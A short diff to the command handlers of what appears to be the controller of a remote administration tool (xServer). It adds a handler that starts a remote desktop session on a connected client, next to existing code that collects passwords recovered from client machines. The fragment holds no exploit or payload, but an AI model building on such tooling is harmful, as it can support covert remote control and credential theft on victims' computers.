@@ -41,6 +41,10 @@ namespace xServer.Core.Commands
             if (client.Value != null && client.Value.FrmPass != null)
                 client.Value.FrmPass.AddPasswords(lst.ToArray(), userAtPc);
         }
+        public static void HandleRemoteDesktopProtocol(Client client)
+        {
+            new DoRemoteDesktopProtocol(false).Execute(client);
+        }
         public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
         {
             if (client.Value == null 
